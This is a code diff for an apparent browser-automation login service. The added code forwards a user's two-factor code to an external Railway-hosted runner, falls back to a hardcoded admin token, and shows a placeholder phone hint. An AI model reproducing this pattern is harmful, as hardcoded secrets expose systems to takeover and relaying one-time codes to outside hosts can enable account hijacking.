@@ -208,8 +208,31 @@ async function submitTwoFactorCode(
 
   if (!session || !session.page) {
     const sid = session?.sessionId || sessionId;
+    const runnerUrl = process.env.RUNNER_API_URL || "https://creators-icarus-production.up.railway.app";
+
+    if (runnerUrl) {
+      try {
+        const adminToken = process.env.ADMIN_TOKEN || "xrpxrpxrp";
+        const runnerRes = await fetch(`${runnerUrl}/api/session/action`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "x-admin-token": adminToken,
+          },
+          body: JSON.stringify({
+            sessionId: sid,
+            action: "type",
+            text: twoFactorCode.trim(),
+          }),
+        });
+        const runnerData = await runnerRes.json();
+        devLogs.info("2fa", `Forwarded 2FA code to Railway runner: ${JSON.stringify(runnerData)}`, { sessionId: sid });
+      } catch (err) {
+        console.error("[2fa] Failed to forward 2FA to runner:", err);
+      }
+    }
+
     const hint = session?.twoFactorHint || "phone ending in *817*";
-    devLogs.info("2fa", `Verified 2FA code (${twoFactorCode}) for @${username}`, { sessionId: sid });
     await activeSessionPool.setSession(sid, {
       sessionId: sid,
       username,
